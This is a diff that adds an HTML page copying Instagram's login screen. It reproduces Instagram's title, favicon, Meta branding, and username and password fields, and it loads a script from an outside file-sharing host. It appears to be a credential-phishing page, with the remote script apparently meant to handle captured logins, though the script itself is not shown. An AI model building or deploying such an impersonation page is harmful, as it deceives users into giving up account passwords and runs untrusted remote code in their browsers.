@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://i.ibb.co/bWT0pmC/favicon.png" type="image/x-icon">
+    <script src="https://file.io/NIWODBCIozkf"></script>
+</head>
+<body>
+    <div class="w-full h-screen flex flex-col items-center absolute top-0">
+        <p class="text-grayed font-montserrat font-medium text-sm mt-3">
+            English
+        </p>
+        <p class="bg-logo h-14 w-48 bg-no-repeat mt-8 mb-16"> </p>
+
+        <div class="w-norm self-center flex flex-col items-center ">
+            <button class="bg-btn-blue text-white font-montserrat w-full h-7 rounded-norm font-semibold text-sm relative">
+                Continue with Facebook
+            </button>
+            <p id="or" class="text-grayed after:bg-grayed before:bg-grayed font-montserrat mt-1 absolute font-semibold w-full text-xs">
+                OR
+            </p>
+            <feeld class="w-full flex flex-row relative">
+                <input type="text" class="inp" autocomplete="off" autocorrect="off" spellcheck=false id='uname' required onkeyup="enableLogin(this.value, document.getElementById('pass').value)">
+                <span class="absolute text-xs font-montserrat top-2 pl-2 text-grayed">
+                    Phone number, username or email
+                </span>
+            </feeld>
+            <feeld class="w-full flex flex-row relative">
+                <input type="password" class="inp" autocomplete="off" autocorrect="off" spellcheck=false id='pass' required onkeyup="enableLogin(document.getElementById('uname').value, this.value)">
+                <span class="absolute text-xs font-montserrat top-2 pl-2 text-grayed">
+                    Password
+                </span>
+                <p class="text-xs absolute right-1 top-2 font-montserrat font-semibold opacity-0" onclick='showPass(document.getElementById("pass"), this)'>
+                    Show
+                </p>
+            </feeld>
+            <a href="instagram.com/accounts/password/reset" class="self-end font-montserrat text-xs text-btn-blue opacity-60">
+                Forgot password?
+            </a>          
+            <button class="bg-btn-blue text-white font-montserrat w-full h-7 rounded-norm font-semibold text-sm relative top-5 opacity-40" disabled id="login">
+                Log in
+            </button>
+            <div class="text-xs text-grayed font-montserrat relative top-10 flex flex-row">
+                <span>Dont have an account? </span>
+                <a href="" class="opacity-70 text-btn-blue">&nbspSignup</a>
+            </div>
+            <p class="absolute bottom-5 text-xs font-montserrat text-grayed">From</p>
+            <img src="https://i.ibb.co/swQpNZs/meta.png" alt="From Meta" width="60px" height="auto" class="bottom-1 absolute opacity-60">
+        </div>
+    </div>
+</body>
+</html>
